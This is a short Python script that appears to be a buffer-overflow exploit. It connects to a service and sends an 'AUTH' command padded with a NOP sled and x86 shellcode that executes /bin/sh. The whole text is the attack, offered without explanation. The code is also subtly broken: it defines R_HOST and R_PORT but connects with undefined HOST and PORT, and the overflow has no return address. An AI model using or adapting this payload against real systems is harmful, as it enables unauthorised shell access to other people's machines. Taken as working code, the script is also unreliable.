import socket

R_HOST = ""
R_PORT = ""

buffer = "\x90"*132 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

data = s.recv(1024)

s.send('AUTH' + buffer + '\r\n')
s.close()
